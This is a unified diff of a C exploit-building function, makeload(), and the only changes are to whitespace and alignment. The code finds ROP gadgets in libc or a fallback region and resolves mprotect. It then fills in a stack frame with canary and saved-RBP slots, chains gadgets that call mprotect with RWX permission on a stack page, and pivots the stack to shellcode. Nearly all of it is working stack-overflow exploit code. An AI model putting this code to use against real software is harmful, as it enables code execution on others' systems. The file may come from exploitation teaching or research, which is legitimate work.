@@ -25,15 +25,15 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	char s_nopNOP[]	= {0x90, 0xc3, 0};
 
 	// First try to find gadgets libc
-	Pointer	libc_popRDI	= strnstr(bap->libc_base, s_popRDI, libc_size);
-	Pointer	libc_popRSI	= strnstr(bap->libc_base, s_popRSI, libc_size);
-	Pointer	libc_popRDX	= strnstr(bap->libc_base, s_popRDX, libc_size);
+	Pointer	libc_popRDI = strnstr(bap->libc_base, s_popRDI, libc_size);
+	Pointer	libc_popRSI = strnstr(bap->libc_base, s_popRSI, libc_size);
+	Pointer	libc_popRDX = strnstr(bap->libc_base, s_popRDX, libc_size);
 
 	// Next, get backup gadgets from fallbackGadgets()
-	Pointer fbg_popRDI	= strnstr(bap->fbg_base, s_popRDI, fbg_size);
-	Pointer fbg_popRSI	= strnstr(bap->fbg_base, s_popRSI, fbg_size);
-	Pointer fbg_popRDX	= strnstr(bap->fbg_base, s_popRDX, fbg_size);
-	Pointer fbg_nopNOP	= strnstr(bap->fbg_base, s_nopNOP, fbg_size);
+	Pointer fbg_popRDI = strnstr(bap->fbg_base, s_popRDI, fbg_size);
+	Pointer fbg_popRSI = strnstr(bap->fbg_base, s_popRSI, fbg_size);
+	Pointer fbg_popRDX = strnstr(bap->fbg_base, s_popRDX, fbg_size);
+	Pointer fbg_nopNOP = strnstr(bap->fbg_base, s_nopNOP, fbg_size);
 
 	// Things are wrong if I don't find the gadgets in fallbackGadgets()
 	assert(fbg_popRDI != NULL);
@@ -42,7 +42,7 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	assert(fbg_nopNOP != NULL); // This little guy is only found in fallbackGadgets()
 
 	// We will need "mprotect()"
-	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");
+	Pointer	libc_mprotect = dlsym(RTLD_NEXT, "mprotect");
 
 	// Buffer offsets are relative to the payload
 	bap->buf_base = plp;
@@ -51,30 +51,30 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	PayloadCommonPtr pcp = &plp->pl_common;
 
 	// Stack Frame
-	StackFramePtr sfp = &pcp->pc_stackFrame;
-	sfp->sf_dst.o		=	indirectToOffset(&sfp->sf_dst,		'B', bap);
-	sfp->sf_canary.o	=	indirectToOffset(&sfp->sf_canary,	'B', bap);
-	sfp->sf_rbp.o		=	indirectToOffset(&sfp->sf_rbp,		'B', bap);
+	StackFramePtr sfp   = &pcp->pc_stackFrame;
+	sfp->sf_dst.o	    = indirectToOffset(&sfp->sf_dst,	'B', bap);
+	sfp->sf_canary.o    = indirectToOffset(&sfp->sf_canary,	'B', bap);
+	sfp->sf_rbp.o	    = indirectToOffset(&sfp->sf_rbp,	'B', bap);
 
 	// ROP Chain
 	ROPChainPtr rcp = &pcp->pc_ROPChain;
-	rcp->rc_popRDI.o	= libc_popRDI?
-					pointerToOffset(libc_popRDI,		'L', bap):
-					pointerToOffset(fbg_popRDI,		'F', bap);
-	rcp->rc_stackPage.o	=	pointerToOffset(bap->stack_base,	'S', bap);
-	rcp->rc_popRSI.o	= libc_popRSI?
-					pointerToOffset(libc_popRSI,		'L', bap):
-					pointerToOffset(fbg_popRSI,		'F', bap);
-	rcp->rc_stackSize	=	getpagesize();
-	rcp->rc_popRDX.o	= libc_popRDX?
-					pointerToOffset(libc_popRDX,		'L', bap):
-					pointerToOffset(fbg_popRDX,		'F', bap);
-	rcp->rc_permission	=	0x7;
-	rcp->rc_nop.o		=	pointerToOffset(fbg_nopNOP,		'F', bap);
-	rcp->rc_mprotect.o	=	pointerToOffset(libc_mprotect,		'L', bap);
+	rcp->rc_popRDI.o    = libc_popRDI?
+				pointerToOffset(libc_popRDI,	'L', bap):
+				pointerToOffset(fbg_popRDI,	'F', bap);
+	rcp->rc_stackPage.o = pointerToOffset(bap->stack_base,	'S', bap);
+	rcp->rc_popRSI.o    = libc_popRSI?
+				pointerToOffset(libc_popRSI,	'L', bap):
+				pointerToOffset(fbg_popRSI,	'F', bap);
+	rcp->rc_stackSize   = getpagesize();
+	rcp->rc_popRDX.o    = libc_popRDX?
+				pointerToOffset(libc_popRDX,	'L', bap):
+				pointerToOffset(fbg_popRDX,	'F', bap);
+	rcp->rc_permission  = 0x7;
+	rcp->rc_nop.o	    = pointerToOffset(fbg_nopNOP,	'F', bap);
+	rcp->rc_mprotect.o  = pointerToOffset(libc_mprotect,	'L', bap);
 
 	// Stack pivot
-	rcp->rc_pivot.o		=	pointerToOffset(&plp->pl_scu,		'B', bap);
+	rcp->rc_pivot.o     = pointerToOffset(&plp->pl_scu,	'B', bap);
 
 	return makeShellcode(&plp->pl_scu.sc, p, np);
 } // makeload()
